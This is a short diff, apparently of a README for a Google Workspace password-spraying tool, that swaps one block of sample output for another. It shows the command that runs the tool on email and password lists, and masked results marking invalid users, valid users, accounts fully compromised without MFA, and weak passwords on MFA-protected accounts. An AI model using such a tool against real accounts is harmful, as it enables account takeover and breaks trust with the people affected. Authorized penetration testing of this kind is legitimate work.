@@ -14,22 +14,18 @@ Google Workspace Password Sprayer
 
 $ python3 google-spray.py emails.txt passwords.txt
 
-[*] Loaded 15 emails and 5 passwords. Starting browser engine...
-[-] Invalid User: sam***************
-[-] Invalid User: sam***************
-[-] Invalid User: sam***************
-[-] Invalid User: sam***************
-[-] Invalid User: sam***************
-[-] Invalid User: sam***************
-[+] VALID USER: s.a***************
-    [!!] WEAK PASSWORD + MFA ACTIVE: jan*************** / P********  [MFA type: PWD]
-[-] Invalid User: sam***************
-[-] Invalid User: asa***************
-[-] Invalid User: a.s***************
-[-] Invalid User: ami***************
-[-] Invalid User: ami***************
-[-] Invalid User: ami***************
-[-] Invalid User: ami***************
-[-] Invalid User: sa***************
+[*] Loaded 9 emails and 6 passwords. Starting browser engine...
+[-] Invalid user: j.s***@sho**********.com
+[-] Invalid user: js@sho**********.com
+[+] VALID USER: jan**@sho**********.com
+    [!] FULL COMPROMISE (no MFA): jan**@sho**********.com / W******
+[-] Invalid user: jas**@sho**********.com
+[-] Invalid user: jw@sho**********.com
+[+] VALID USER: jas****@sho**********.com
+    [!] FULL COMPROMISE (no MFA): jas****@sho**********.com / 8mc***********
+[-] Invalid user: roh**@sho**********.com
+[-] Invalid user: ra@sho**********.com
+[+] VALID USER: roh****@sho**********.com
+    [!] WEAK PASSWORD + MFA ACTIVE: roh****@sho**********.com / Gi**********!  [MFA type: TOTP]
 ```
 
